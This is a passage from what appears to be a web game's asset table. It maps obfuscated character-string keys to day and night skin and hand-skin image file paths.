			"ⵠᐃΔΔⲆΔΔ": "img/night-skin43.png",
			"ⵠⲆⵠᐃΔΔΔ": "img/day-skin44.png",
			"ⲆⲆΔΔΔΔⲆ": "img/night-skin44.png",
			"ⲆⲆⲆᐃΔᐃΔ": "img/day-skin45.png",
			"ΔΔⲆᐃᐃᐃΔ": "img/night-skin45.png",
			"ᐃⲆᐃⲆΔᐃⲆ": "img/day-skin46.png",
			"ᐃⲆⵠⲆⲆΔⵠ": "img/night-skin46.png",
			"ΔⲆΔΔⵠⲆⲆ": "img/day-skin47.png",
			"ᐃⲆᐃⲆⵠⵠⲆ": "img/night-skin47.png",
			"ⵠΔⵠⵠΔᐃΔ": "img/day-skin48.png",
			"ⵠΔⵠᐃⲆᐃⵠ": "img/night-skin48.png",
			"Ⲇⵠⵠᐃⵠⵠᐃ": "img/day-skin49.png",
			"ΔᐃⲆⵠᐃᐃᐃ": "img/night-skin49.png",
			"ᐃΔΔⲆⵠᐃⵠ": "img/day-skin50.png",
			"ᐃᐃⵠⲆⵠᐃΔ": "img/night-skin50.png",
			"ΔⵠⵠⵠⲆᐃΔ": "img/day-skin51.png",
			"ΔⲆΔΔⵠΔᐃ": "img/night-skin51.png",
			"ᐃⵠⵠⵠΔⲆᐃ": "img/day-skin52.png",
			"ᐃᐃⲆⲆⲆⵠⵠ": "img/night-skin52.png",
			"ΔᐃΔᐃᐃΔᐃ": "img/day-skin53.png",
			"ᐃΔⲆᐃΔⵠⵠ": "img/night-skin53.png",
			"ΔᐃᐃⵠᐃΔⲆ": "img/day-skin54.png",
			"ᐃⲆⲆⵠⲆᐃⲆ": "img/night-skin54.png",
			"ᐃⲆᐃⵠⲆⵠⵠ": "img/day-skin55.png",
			"ᐃⵠᐃⵠΔΔᐃ": "img/night-skin55.png",
			"ⵠᐃΔᐃⵠⲆⲆ": "img/day-skin56.png",
			"ⵠΔᐃᐃΔⲆᐃ": "img/night-skin56.png",
			"ⲆΔᐃΔⲆⲆⵠ": "img/day-skin57.png",
			"ᐃᐃᐃΔΔⲆⵠ": "img/night-skin57.png",
			"ᐃⲆⵠΔⲆⲆΔ": "img/day-skin58.png",
			"ΔⲆⲆⲆⵠⲆⲆ": "img/night-skin58.png",
			"ᐃⵠⵠᐃⲆΔⲆ": "img/day-skin59.png",
			"ᐃΔᐃⵠΔⲆⵠ": "img/night-skin59.png",
			"ⲆᐃᐃⲆⵠᐃᐃ": "img/day-skin60.png",
			"ᐃΔᐃⵠΔᐃᐃ": "img/night-skin60.png",
			"ⲆⲆⵠᐃΔᐃⵠ": "img/day-skin61.png",
			"ⵠᐃΔΔΔΔΔ": "img/night-skin61.png",
			"ⵠᐃΔⵠᐃᐃᐃ": "img/day-skin62.png",
			"ΔᐃᐃᐃΔᐃΔ": "img/night-skin62.png",
			"ΔⲆΔⲆⲆⲆⲆ": "img/day-skin63.png",
			"ΔᐃΔᐃᐃⲆⲆ": "img/night-skin63.png",
			"ΔΔⵠⵠⵠⲆⵠ": "img/day-skin64.png",
			"Ⲇⵠⵠⵠᐃⵠⵠ": "img/night-skin64.png",
			"ⵠᐃⲆⵠⵠⵠⵠ": "img/day-skin65.png",
			"ᐃᐃⲆⵠΔᐃΔ": "img/night-skin65.png",
			"Δⵠᐃᐃⵠᐃⵠ": "img/day-skin66.png",
			"ⵠᐃΔΔᐃᐃᐃ": "img/night-skin66.png",
			"ᐃᐃⵠΔΔᐃⲆ": "img/day-skin67.png",
			"ΔΔΔᐃⲆⲆⵠ": "img/night-skin67.png",
			"ΔᐃⲆⵠᐃᐃΔ": "img/day-skin68.png",
			"ⲆΔⲆⲆⲆⵠⲆ": "img/night-skin68.png",
			"ᐃΔⵠⵠΔⲆΔ": "img/day-skin69.png",
			"ᐃⵠⵠΔⵠᐃⲆ": "img/night-skin69.png",
			"ⵠⲆΔΔᐃⵠᐃ": "img/day-skin70.png",
			"ᐃⵠⵠⲆⵠᐃᐃ": "img/night-skin70.png",
			"ΔⲆΔΔⲆΔᐃ": "img/day-skin71.png",
			"ⲆΔⵠᐃᐃⵠⵠ": "img/night-skin71.png",
			"ⵠᐃΔⵠᐃᐃⵠ": "img/day-skin72.png",
			"ΔⵠⲆⲆⲆΔⵠ": "img/night-skin72.png",
			"ᐃⲆⲆⲆΔΔⲆ": "img/day-skin73.png",
			"ᐃⲆⵠⲆΔⵠᐃ": "img/night-skin73.png",
			"ⵠΔⲆΔΔⵠⲆ": "img/day-skin74.png",
			"ⲆⵠᐃⵠⵠⵠΔ": "img/night-skin74.png",
			"ᐃΔΔΔⲆᐃᐃ": "img/day-skin75.png",
			"ᐃᐃᐃΔⵠᐃⵠ": "img/night-skin75.png",
			"Δⵠⵠⵠⵠⵠⵠ": "img/day-skin76.png",
			"ᐃⵠΔⲆⵠᐃⲆ": "img/night-skin76.png",
			"ⲆⲆⲆΔᐃΔᐃ": "img/day-skin77.png",
			"ⲆᐃᐃⵠⲆⵠᐃ": "img/night-skin77.png",
			"ⲆΔⲆⲆᐃⵠᐃ": "img/day-skin78.png",
			"ᐃΔᐃⵠⵠᐃⵠ": "img/night-skin78.png",
			"ΔⲆᐃΔᐃᐃᐃ": "img/day-skin79.png",
			"ΔⲆⵠⵠΔᐃⵠ": "img/night-skin79.png",
			"ⵠΔΔᐃⲆᐃΔ": "img/day-skin80.png",
			"ⵠΔΔΔⵠᐃⲆ": "img/night-skin80.png",
			"ᐃᐃⵠⵠⵠⲆⵠ": "img/day-skin81.png",
			"ΔⵠⵠⵠΔΔᐃ": "img/night-skin81.png",
			"ⵠⵠΔⵠⵠᐃⵠ": "img/day-skin82.png",
			"ᐃΔⵠᐃΔᐃΔ": "img/night-skin82.png",
			"ΔΔⵠΔⲆΔᐃ": "img/day-skin83.png",
			"ⵠⵠᐃΔⲆᐃⵠ": "img/night-skin83.png",
			"ΔⲆΔⲆⵠⲆⲆ": "img/day-skin84.png",
			"ᐃᐃᐃΔᐃⵠⲆ": "img/night-skin84.png",
			"ⵠⲆᐃⲆᐃᐃΔ": "img/day-skin85.png",
			"ΔᐃⲆⲆᐃⵠⲆ": "img/night-skin85.png",
			"ΔⲆᐃᐃΔΔⲆ": "img/day-skin86.png",
			"ⵠⲆⲆᐃΔⵠⵠ": "img/night-skin86.png",
			"ᐃⵠᐃⵠⵠⲆⵠ": "img/day-skin87.png",
			"ΔΔᐃⵠΔᐃΔ": "img/night-skin87.png",
			"ᐃⵠᐃⲆⵠⲆⲆ": "img/day-skin88.png",
			"ⲆᐃⵠᐃΔᐃⲆ": "img/night-skin88.png",
			"ΔⲆᐃᐃᐃⵠΔ": "img/day-skin89.png",
			"ᐃᐃΔΔᐃⲆᐃ": "img/night-skin89.png",
			"ΔᐃΔⵠᐃΔⲆ": "img/day-skin90.png",
			"ΔⵠᐃᐃΔⲆⵠ": "img/night-skin90.png",
			"ⵠⵠⵠΔⵠⵠΔ": "img/day-skin91.png",
			"ᐃᐃΔⵠⲆΔΔ": "img/night-skin91.png",
			"ᐃⲆⵠⲆΔᐃᐃ": "img/day-skin92.png",
			"ⲆⵠⵠΔᐃΔⲆ": "img/night-skin92.png",
			"ⲆⵠⵠᐃΔΔⲆ": "img/day-skin93.png",
			"ᐃⵠⵠⵠΔᐃᐃ": "img/night-skin93.png",
			"ⲆⵠᐃⵠⵠΔᐃ": "img/day-skin94.png",
			"ⵠⲆⲆⲆᐃΔΔ": "img/night-skin94.png",
			"ᐃⲆΔⲆⵠⵠΔ": "img/day-skin95.png",
			"ΔᐃᐃᐃⵠⵠΔ": "img/night-skin95.png",
			"ⲆΔⲆᐃΔⲆⲆ": "img/day-skin96.png",
			"ⲆᐃΔⲆⵠᐃⵠ": "img/night-skin96.png",
			"ⵠⲆⲆᐃⲆⵠᐃ": "img/day-skin97.png",
			"ⵠⵠⲆⲆᐃΔΔ": "img/night-skin97.png",
			"ΔΔΔᐃΔⲆⵠ": "img/day-skin98.png",
			"ᐃᐃⲆᐃⲆⲆⵠ": "img/night-skin98.png",
			"ΔΔⲆΔⵠⵠᐃ": "img/day-skin99.png",
			"ᐃΔΔΔⲆΔⲆ": "img/night-skin99.png",
			"ᐃᐃⲆⵠᐃᐃⵠ": "img/day-skin100.png",
			"ⵠⵠⵠΔⵠⵠᐃ": "img/night-skin100.png",
			"ⵠⵠΔΔⵠᐃⲆ": "img/day-skin101.png",
			"ⵠᐃⵠᐃΔΔᐃ": "img/night-skin101.png",
			"ΔᐃᐃΔⵠⵠⲆ": "img/day-skin102.png",
			"ⵠᐃΔᐃᐃΔⵠ": "img/night-skin102.png",
			"ᐃΔᐃΔⲆΔⵠ": "img/day-skin103.png",
			"ΔⲆⲆⵠᐃᐃΔ": "img/night-skin103.png",
			"ⵠΔⲆΔⲆⵠᐃ": "img/day-skin104.png",
			"ⵠΔᐃΔΔⲆᐃ": "img/night-skin104.png",
			"ΔⵠⲆⵠⵠⲆᐃ": "img/day-skin105.png",
			"ᐃΔⵠⲆΔⵠⲆ": "img/night-skin105.png",
			"ⲆⵠΔⲆⲆΔᐃ": "img/day-skin106.png",
			"ΔⲆⲆⵠΔⵠᐃ": "img/night-skin106.png",
			"ΔᐃⲆΔᐃⲆΔ": "img/day-skin107.png",
			"ᐃΔⵠᐃΔⲆⲆ": "img/night-skin107.png",
			"ΔΔΔΔᐃᐃΔ": "img/day-skin108.png",
			"ΔΔⲆᐃⵠΔⲆ": "img/night-skin108.png",
			"ᐃⲆΔⲆⲆⲆⵠ": "img/day-skin109.png",
			"ⵠⲆΔⲆᐃΔᐃ": "img/night-skin109.png",
			"ΔⵠΔⵠᐃⵠⲆ": "img/day-skin110.png",
			"ⵠⵠⵠⵠⲆⲆⲆ": "img/night-skin110.png",
			"ⲆⲆΔΔᐃⲆⲆ": "img/day-skin111.png",
			"ΔᐃᐃΔᐃΔΔ": "img/night-skin111.png",
			"ΔⵠⵠⲆΔᐃⲆ": "img/day-skin112.png",
			"ΔᐃᐃⵠᐃᐃΔ": "img/night-skin112.png",
			"ⲆΔΔⲆΔⵠⵠᐃⲆ": "img/day-skin113.png",
			"ΔᐃΔⵠΔⵠΔⵠᐃ": "img/night-skin113.png",
			"ᐃΔⵠⵠⲆⲆⲆ": "img/day-skin114.png",
			"ΔⵠⲆΔΔⲆⲆ": "img/night-skin114.png",
			"ⵠᐃΔⵠᐃⲆⲆ": "img/day-skin115.png",
			"ᐃΔⲆⵠΔⲆΔ": "img/night-skin115.png",
			"ⲆᐃᐃΔⲆⵠΔ": "img/day-skin116.png",
			"ⵠΔΔⵠⵠⲆⵠ": "img/night-skin116.png",
			"ΔⵠᐃⵠΔⲆⵠ": "img/day-skin117.png",
			"ᐃΔⲆΔᐃΔⲆ": "img/night-skin117.png",
			"ⲆⲆⲆΔⲆΔⵠ": "img/day-skin118.png",
			"ⲆⵠᐃⵠⲆⲆᐃ": "img/night-skin118.png",
			"ΔᐃΔⵠⲆΔΔ": "img/day-skin119.png",
			"ⵠΔΔΔᐃᐃΔ": "img/night-skin119.png",
			"ⲆⲆⵠΔⲆΔⵠ": "img/day-skin120.png",
			"ΔᐃᐃⵠⲆᐃΔ": "img/night-skin120.png",
			"ΔᐃⵠⵠⲆΔⵠ": "img/day-skin121.png",
			"ΔⵠΔᐃΔⲆᐃ": "img/night-skin121.png",
			"ᐃⵠΔⲆⲆᐃΔ": "img/day-skin122.png",
			"ᐃⲆⵠΔⵠⵠᐃ": "img/night-skin122.png",
			"ⲆⲆᐃⵠⲆⵠᐃ": "img/day-skin123.png",
			"ⵠⲆᐃⵠⵠⲆⲆ": "img/night-skin123.png",
			"ⵠⵠⲆⵠⲆΔⲆ": "img/day-skin124.png",
			"ΔᐃⵠᐃᐃⲆᐃ": "img/night-skin124.png",
			"ⲆⲆⲆⲆᐃⲆΔ": "img/day-skin125.png",
			"ⲆΔᐃⵠᐃⵠᐃ": "img/night-skin125.png",
			"ⵠⲆᐃⲆΔᐃⵠ": "img/day-skin126.png",
			"ⲆⲆΔⲆⲆⵠⵠ": "img/night-skin126.png",
			"ⵠᐃⲆⲆΔⵠⲆ": "img/day-skin127.png",
			"ΔᐃⲆᐃΔΔᐃ": "img/night-skin127.png",
			"ΔᐃΔⲆΔⵠᐃ": "img/day-skin128.png",
			"ⵠΔΔⵠⲆᐃΔ": "img/night-skin128.png",
			"ΔⵠΔᐃⵠⵠΔ": "img/day-skin129.png",
			"ΔⵠⲆⵠⲆⵠΔ": "img/night-skin129.png",
			"ⵠΔΔΔΔΔΔ": "img/day-skin130-1.png",
			"ⲆⵠΔΔΔⵠⵠ": "img/night-skin130-1.png",
			"ΔⲆᐃⵠᐃΔⵠ": "img/day-skin131.png",
			"ᐃᐃⵠᐃⲆΔΔ": "img/night-skin131.png",
			"ⵠᐃⲆᐃᐃᐃⵠ": "img/day-skin132.png",
			"ⲆⲆⲆⵠⵠⲆΔ": "img/night-skin132.png",
			"ΔⲆⲆΔΔⵠⲆ": "img/day-skin133.png",
			"ⲆⵠᐃⲆΔⵠⲆ": "img/night-skin133.png",
			"ⲆΔΔⵠΔᐃⲆ": "img/day-skin134.png",
			"ⲆⵠⵠΔⲆⵠΔ": "img/night-skin134.png",
			"ⲆΔᐃⲆⲆⵠⲆ": "img/day-skin135.png",
			"ⵠⲆⵠΔΔⵠⲆ": "img/night-skin135.png",
			"ΔⵠⲆⵠΔΔᐃ": "img/day-skin136.png",
			"ⵠⵠᐃΔΔΔⵠ": "img/night-skin136.png",
			"ΔᐃΔᐃΔΔΔ": "img/day-skin137.png",
			"ΔΔΔᐃᐃᐃⵠ": "img/night-skin137.png",
			"ΔΔᐃᐃⵠⲆΔ": "img/day-skin138.png",
			"ⲆⵠⲆΔΔⲆᐃ": "img/night-skin138.png",
			"ᐃᐃⲆᐃⲆᐃⲆ": "img/day-skin139.png",
			"ⵠⵠᐃΔⵠⲆⲆ": "img/night-skin139.png",
			"ⲆΔⵠⲆΔΔⲆ": "img/day-skin140.png",
			"ᐃΔΔⵠⲆⲆΔ": "img/night-skin140.png",
			"ⵠΔᐃⲆⵠⲆⲆ": "img/day-skin141.png",
			"ΔᐃⵠⲆᐃΔᐃ": "img/night-skin141.png",
			"ⵠΔΔⵠᐃⵠᐃ": "img/day-skin142.png",
			"ᐃΔΔⵠΔⲆᐃ": "img/night-skin142.png",
			"ᐃᐃⵠᐃⵠⲆᐃ": "img/day-skin143.png",
			"ΔΔⵠⲆⵠⲆᐃ": "img/night-skin143.png",
			"ⲆΔⲆΔᐃⲆΔ": "img/day-skin144.png",
			"ⲆᐃΔᐃᐃⵠᐃ": "img/night-skin144.png",
			"ⲆⵠᐃΔⲆᐃᐃ": "img/day-skin145.png",
			"ⲆⵠⲆⵠⵠᐃⲆ": "img/night-skin145.png",
			"ⲆᐃᐃⵠⲆⵠΔ": "img/day-skin146.png",
			"ⲆⲆᐃΔᐃΔⲆ": "img/night-skin146.png",
			"ⵠΔΔΔᐃⲆⲆ": "img/day-skin147.png",
			"ᐃΔΔᐃΔᐃΔ": "img/night-skin147.png",
			"ⵠΔⵠΔⲆΔΔ": "img/day-skin148.png",
			"ⵠᐃΔⵠⲆΔΔ": "img/night-skin148.png",
			"ᐃⲆΔᐃᐃⲆΔ": "img/day-skin149.png",
			"ᐃⲆⵠΔⲆⵠΔ": "img/night-skin149.png",
			"ᐃΔΔⵠⲆⵠᐃ": "img/day-skin150.png",
			"ⵠΔⵠΔΔᐃΔ": "img/night-skin150.png",
			"ⵠⵠⲆᐃⲆⲆⵠ": "img/day-skin151.png",
			"ᐃΔΔⵠⲆⲆⵠ": "img/night-skin151.png",
			"ⲆⲆᐃⲆᐃΔⲆ": "img/day-skin152.png",
			"ⲆΔⵠΔⵠᐃΔ": "img/night-skin152.png",
			"ᐃⲆⲆΔⲆᐃΔ": "img/day-skin153.png",
			"ᐃⲆⵠⲆⲆⵠⵠ": "img/night-skin153.png",
			"ΔᐃⲆⵠᐃᐃⲆ": "img/day-skin154.png",
			"ⵠⲆⲆⲆⲆΔⵠ": "img/night-skin154.png",
			"ΔΔⵠΔⵠᐃⲆ": "img/day-skin155.png",
			"ⲆⲆⵠⵠΔᐃⲆ": "img/night-skin155.png",
			"ΔⲆᐃᐃⲆⲆΔ": "img/day-skin156.png",
			"ⵠⵠΔⵠⵠᐃΔ": "img/night-skin156.png",
			"ΔΔⵠⵠᐃⵠⵠ": "img/day-skin157.png",
			"ΔᐃⵠⲆⲆΔᐃ": "img/night-skin157.png",
			"ΔΔⵠᐃⲆΔᐃ": "img/day-skin158.png",
			"ᐃⵠᐃᐃᐃⲆᐃ": "img/night-skin158.png",
			"ᐃⵠⵠⵠⵠⲆΔ": "img/day-skin159.png",
			"ⲆⲆᐃΔᐃΔᐃ": "img/night-skin159.png",
			"ΔᐃᐃⵠⵠⵠΔ": "img/day-skin160.png",
			"ΔⵠΔΔⲆⲆⲆ": "img/night-skin160.png",
			"ⵠⲆⲆᐃᐃⵠⲆ": "img/day-skin161.png",
			"ⵠΔᐃᐃΔᐃᐃ": "img/night-skin161.png",
			"ⲆΔΔⲆⲆΔΔ": "img/day-skin162.png",
			"ⵠⵠⵠΔΔⲆΔ": "img/night-skin162.png",
			"ᐃⵠᐃⵠΔΔⲆ": "img/day-skin163.png",
			"ⲆⵠⲆᐃⲆΔⲆ": "img/night-skin163.png",
			"ⲆⲆⲆⲆⵠΔΔ": "img/day-skin164.png",
			"ⲆΔⵠⲆΔⲆᐃ": "img/night-skin164.png",
			"ⲆᐃⵠⵠᐃⲆΔ": "img/day-skin165.png",
			"ΔⲆΔᐃΔᐃΔ": "img/night-skin165.png",
			"ΔΔΔᐃⲆⲆⲆ": "img/day-skin166.png",
			"ⲆⲆᐃᐃⲆᐃᐃ": "img/night-skin166.png",
			"ⵠⲆⵠᐃⲆᐃΔ": "img/day-skin167.png",
			"ᐃⲆᐃⲆᐃⲆᐃ": "img/night-skin167.png",
			"ⲆⲆⲆΔᐃᐃⵠ": "img/day-skin168.png",
			"ⲆⲆΔΔᐃᐃⲆ": "img/night-skin168.png",
			"ΔⵠⲆΔΔᐃΔ": "img/day-skin169.png",
			"ⲆΔᐃⵠΔΔⲆ": "img/night-skin169.png",
			"ⵠⵠⵠᐃⲆⵠᐃ": "img/day-skin170.png",
			"ᐃᐃⲆΔΔⵠⵠ": "img/night-skin170.png",
			"ⲆᐃⲆⲆⲆΔⵠ": "img/day-skin171.png",
			"ⲆⲆⵠⵠⵠⲆΔ": "img/night-skin171.png",
			"ⵠΔΔⵠᐃᐃΔ": "img/day-skin172.png",
			"ᐃΔⲆⵠⵠᐃᐃ": "img/night-skin172.png",
			"ⵠⵠⵠⲆⵠΔⵠ": "img/day-skin173.png",
			"ⵠᐃⵠⲆΔΔⵠ": "img/night-skin173.png",
			"ᐃΔΔⵠⵠⵠⲆ": "img/day-skin174.png",
			"ⵠᐃⲆᐃΔⵠⲆ": "img/night-skin174.png",
			"ⵠⲆᐃᐃΔΔⲆ": "img/day-skin175.png",
			"ᐃⵠΔⵠᐃⲆΔ": "img/night-skin175.png",
			"ⲆΔᐃⵠᐃΔⲆ": "img/day-skin176.png",
			"ᐃⲆΔᐃⵠΔΔ": "img/night-skin176.png",
			"ΔⲆᐃⲆⵠΔΔ": "img/day-skin177.png",
			"ΔΔᐃⵠᐃⲆⲆ": "img/night-skin177.png",
			"ⵠⵠⵠΔⵠᐃⲆ": "img/day-skin178.png",
			"ᐃⲆⵠᐃᐃⵠᐃ": "img/night-skin178.png",
			"ΔⲆᐃΔⲆⵠⲆ": "img/day-skin179.png",
			"ⵠⵠⲆᐃᐃⲆⵠ": "img/night-skin179.png",
			"ⵠⵠⵠⵠᐃⲆᐃ": "img/day-skin180.png",
			"ⵠⵠΔΔⲆΔⲆ": "img/night-skin180.png",
			"ᐃⲆΔⵠΔⵠᐃ": "img/day-skin181.png",
			"ⵠᐃΔⲆⲆᐃⲆ": "img/night-skin181.png",
			"ΔⵠⵠⵠᐃΔⲆ": "img/day-skin182.png",
			"ΔΔᐃᐃΔΔΔ": "img/night-skin182.png",
			"ΔⵠᐃᐃᐃᐃⲆ": "img/day-skin183.png",
			"ⵠⲆⲆΔΔⵠⵠ": "img/night-skin183.png",
			"ᐃΔⲆᐃΔΔᐃ": "img/day-skin184.png",
			"ΔΔⵠΔⵠⵠⵠ": "img/night-skin184.png",
			"ⵠⲆΔΔᐃᐃⲆ": "img/day-skin185.png",
			"ᐃⵠΔⵠΔΔΔ": "img/night-skin185.png",
			"ⵠΔⲆⵠᐃⲆᐃ": "img/day-skin186.png",
			"ΔᐃᐃⵠⵠⲆⲆ": "img/night-skin186.png",
			"ⵠΔⵠᐃΔΔⲆ": "img/day-skin187.png",
			"ᐃΔΔᐃΔΔᐃ": "img/night-skin187.png",
			"ⲆΔᐃⵠⲆⲆΔ": "img/day-skin188.png",
			"ΔΔΔⵠᐃΔᐃ": "img/night-skin188.png",
			"ΔᐃⵠᐃⲆⲆⵠ": "img/day-skin189.png",
			"ΔⵠⲆⵠⵠⵠΔ": "img/night-skin189.png",
			"ᐃᐃⵠΔⵠⵠⲆ": "img/day-skin190.png",
			"ⵠᐃⵠᐃᐃΔⵠ": "img/night-skin190.png",
			"ᐃᐃᐃᐃᐃⲆⲆ": "img/day-skin191.png",
			"ⲆⵠⵠΔᐃᐃⲆ": "img/night-skin191.png",
			"ΔΔᐃΔⵠⲆⲆ": "img/day-skin192.png",
			"ⲆΔⲆΔⲆⵠⵠ": "img/night-skin192.png",
			"ᐃΔΔⲆⵠⵠⵠ": "img/day-skin193.png",
			"ⵠᐃᐃⵠⵠⵠΔ": "img/night-skin193.png",
			"ᐃᐃΔⲆᐃⲆΔ": "img/day-skin194.png",
			"ⵠⲆΔⵠᐃᐃᐃ": "img/night-skin194.png",
			"ᐃⲆᐃΔⲆⵠΔ": "img/day-skin195.png",
			"ⵠᐃⵠᐃᐃΔⲆ": "img/night-skin195.png",
			"ⲆΔΔⲆΔⵠΔ": "img/day-skin196.png",
			"ⵠⵠⲆⲆᐃⲆⲆ": "img/night-skin196.png",
			"ⲆΔⲆΔΔᐃⲆ": "img/day-skin197.png",
			"ⵠΔΔⵠΔΔⵠ": "img/night-skin197.png",
			"ⲆΔΔᐃᐃΔⵠ": "img/day-skin198.png",
			"ΔΔΔⲆⲆⵠⵠ": "img/night-skin198.png",
			"ΔΔΔΔⲆᐃⲆ": "img/day-skin199.png",
			"ΔⵠΔᐃⲆΔᐃ": "img/night-skin199.png",
			"ⲆΔⲆⵠΔΔⲆ": "img/day-skin200.png",
			"ᐃΔᐃᐃⲆⲆⵠ": "img/night-skin200.png",
			"Ⲇᐃⵠⵠⵠⵠⵠ": "img/day-skin201.png",
			"ΔⲆⲆⵠⲆᐃᐃ": "img/night-skin201.png",
			"ΔⵠⲆⲆⲆΔΔ": "img/day-skin202.png",
			"ⲆⲆⲆⵠΔⲆⵠ": "img/night-skin202.png",
			"ⲆⵠⵠⵠⵠΔΔ": "img/day-skin203.png",
			"ᐃⵠᐃⲆⵠᐃⵠ": "img/night-skin203.png",
			"Ⲇᐃⵠᐃᐃᐃⵠ": "img/day-skin204.png",
			"ⵠᐃⵠᐃⲆᐃΔ": "img/night-skin204.png",
			"ΔⵠⲆⵠⵠᐃᐃ": "img/day-skin205.png",
			"ⵠⵠΔⲆⵠᐃⵠ": "img/night-skin205.png",
			"ᐃⵠΔⲆⵠⲆⲆ": "img/day-skin206.png",
			"ᐃᐃᐃⲆΔᐃⲆ": "img/night-skin206.png",
			"ⵠⵠⲆⵠᐃᐃⲆ": "img/day-skin207.png",
			"ᐃᐃΔΔᐃⲆⲆ": "img/night-skin207.png",
			"ΔⲆΔⲆΔⵠᐃ": "img/day-skin208.png",
			"ⲆⵠΔⵠⲆΔⵠ": "img/night-skin208.png",
			"ⵠⵠᐃⲆᐃⲆⵠ": "img/day-skin209.png",
			"ᐃⵠⲆⲆΔΔⵠ": "img/night-skin209.png",
			"ⵠⵠⵠᐃΔⵠᐃ": "img/day-skin210.png",
			"ᐃⵠⵠΔⲆᐃᐃ": "img/night-skin210.png",
			"ΔᐃⲆᐃᐃΔⵠ": "img/day-skin211.png",
			"ΔⲆΔᐃⵠΔᐃ": "img/night-skin211.png",
			"ΔᐃᐃᐃΔΔⲆ": "img/day-skin212.png",
			"ⵠΔⵠᐃⲆΔⲆ": "img/night-skin212.png",
			"ΔⵠᐃⲆⵠⲆⲆ": "img/day-skin213.png",
			"ⵠᐃᐃⲆⲆᐃᐃ": "img/night-skin213.png",
			"ᐃⲆᐃᐃⲆᐃⵠ": "img/day-skin214.png",
			"ⲆⵠΔⵠᐃᐃⲆ": "img/night-skin214.png",
			"ΔⵠⲆᐃᐃⲆⵠ": "img/day-hand-skin0.png",
			"ᐃΔⲆⲆᐃⲆⲆ": "img/night-hand-skin0.png",
			"ΔᐃⲆⲆᐃΔΔ": "img/day-hand-skin1.png",
			"ᐃⵠΔⵠΔⵠⵠ": "img/night-hand-skin1.png",
			"ⵠⵠⵠⲆⲆⵠⲆ": "img/day-hand-skin2.png",
			"ⲆⲆⲆⵠΔⲆΔ": "img/night-hand-skin2.png",
			"ⵠⵠᐃΔⲆⲆᐃ": "img/day-hand-skin3.png",
			"ᐃΔΔⲆΔΔΔ": "img/night-hand-skin3.png",
			"ᐃᐃᐃⵠΔΔᐃ": "img/day-hand-skin4.png",
			"ΔⵠⵠⲆΔⵠⲆ": "img/night-hand-skin4.png",
			"ΔΔᐃᐃᐃᐃᐃ": "img/day-hand-skin5.png",
			"ᐃⵠΔⵠⲆⵠⲆ": "img/night-hand-skin5.png",
			"ᐃⵠⵠⲆⵠΔⲆ": "img/day-hand-skin6.png",
			"ΔⲆⲆΔⵠⲆⵠᐃΔ": "img/night-hand-skin6.png",
			"ⵠᐃⵠᐃⲆΔΔ": "img/day-hand-skin6.png",
			"Ⲇᐃⵠᐃᐃⵠⵠ": "img/night-hand-skin6.png",
			"ⲆᐃⲆΔᐃⲆΔ": "img/day-hand-skin8.png",
			"ⵠᐃⵠⵠᐃⵠΔ": "img/night-hand-skin8.png",
			"ΔΔⲆᐃΔⲆᐃ": "img/day-hand-skin9.png",
			"ΔⵠᐃⲆⲆᐃⵠ": "img/night-hand-skin9.png",
			"ⲆᐃΔΔᐃⲆⲆ": "img/day-hand-skin10.png",
			"ᐃΔⲆⲆΔᐃΔ": "img/night-hand-skin10.png",
			"ΔΔᐃⵠΔΔⵠ": "img/day-hand-skin11.png",
			"ⲆΔᐃᐃΔΔᐃ": "img/night-hand-skin11.png",
			"ⲆΔᐃⲆᐃⵠⵠ": "img/day-hand-skin12.png",
			"ⲆΔⵠⲆⵠⵠᐃ": "img/night-hand-skin12.png",
			"ⲆⲆⲆᐃⲆⲆⵠ": "img/day-hand-skin13.png",
			"ᐃΔΔᐃⵠⵠⵠ": "img/night-hand-skin13.png",
			"ΔⲆΔΔⵠᐃΔ": "img/day-hand-skin14.png",
			"ΔⵠΔⵠΔᐃᐃ": "img/night-hand-skin14.png",
			"ⲆⲆᐃᐃⲆΔᐃ": "img/day-hand-skin15.png",
			"ᐃⲆᐃⲆΔΔΔ": "img/night-hand-skin15.png",
			"ᐃⵠⵠⲆᐃᐃⵠ": "img/day-hand-skin16.png",
			"ΔⲆⵠⵠⵠᐃⵠ": "img/night-hand-skin16.png",
			"ⲆᐃΔΔⵠⲆΔ": "img/day-hand-skin17.png",
			"ᐃⲆΔᐃΔⲆⲆ": "img/night-hand-skin17.png",
			"ΔΔⲆⵠⵠⵠⲆ": "img/day-hand-skin18.png",
			"ⵠΔᐃⲆᐃⲆΔ": "img/night-hand-skin18.png",
			"ΔⲆΔᐃᐃᐃⵠ": "img/day-hand-skin19.png",
			"ⲆⲆᐃΔⲆⲆⵠ": "img/night-hand-skin19.png",
			"ΔⵠᐃⵠΔᐃΔ": "img/day-hand-skin20.png",
			"ᐃⵠΔⲆᐃⲆᐃ": "img/night-hand-skin20.png",
			"ΔᐃᐃⲆⵠᐃᐃ": "img/day-hand-skin21.png",
			"ⲆᐃᐃᐃⵠΔⵠ": "img/night-hand-skin21.png",
			"ΔᐃΔΔⵠⲆΔ": "img/day-hand-skin22.png",
			"ΔⵠΔⲆⵠⵠΔ": "img/night-hand-skin22.png",
			"ΔᐃᐃᐃⲆⵠⲆ": "img/day-hand-skin23.png",
			"ᐃΔⲆⲆⵠⲆⵠ": "img/night-hand-skin23.png",
			"ᐃᐃⲆΔᐃᐃᐃ": "img/day-hand-skin24.png",
			"ΔⲆΔⲆᐃΔⵠ": "img/night-hand-skin24.png",
			"ⲆΔᐃⲆΔⵠⵠ": "img/day-hand-skin25.png",
			"ⵠᐃᐃΔⲆᐃᐃ": "img/night-hand-skin25.png",
			"ⲆⲆΔⵠⲆΔΔ": "img/day-hand-skin26.png",
			"ⵠΔⲆᐃⵠⵠⵠ": "img/night-hand-skin26.png",
			"ⲆᐃⵠⵠΔⵠᐃ": "img/day-hand-skin27.png",
			"ΔᐃⵠⲆΔⵠᐃ": "img/night-hand-skin27.png",
			"ᐃΔⵠⵠᐃⲆΔ": "img/day-hand-skin28.png",
			"ΔΔᐃΔⵠΔΔ": "img/night-hand-skin28.png",
			"ΔⲆᐃⲆᐃⲆΔ": "img/day-hand-skin29.png",
			"ⲆΔᐃⲆΔΔⵠ": "img/night-hand-skin29.png",
			"ⲆⵠᐃⵠΔᐃⵠ": "img/day-hand-skin30.png",
			"ⵠⲆᐃⵠⲆΔⵠ": "img/night-hand-skin30.png",
			"ⲆΔⵠΔⲆⲆⲆ": "img/day-hand-skin31.png",
			"ΔᐃⲆⵠⵠᐃΔ": "img/night-hand-skin31.png",
			"ᐃᐃⲆⵠΔᐃᐃ": "img/day-hand-skin32.png",
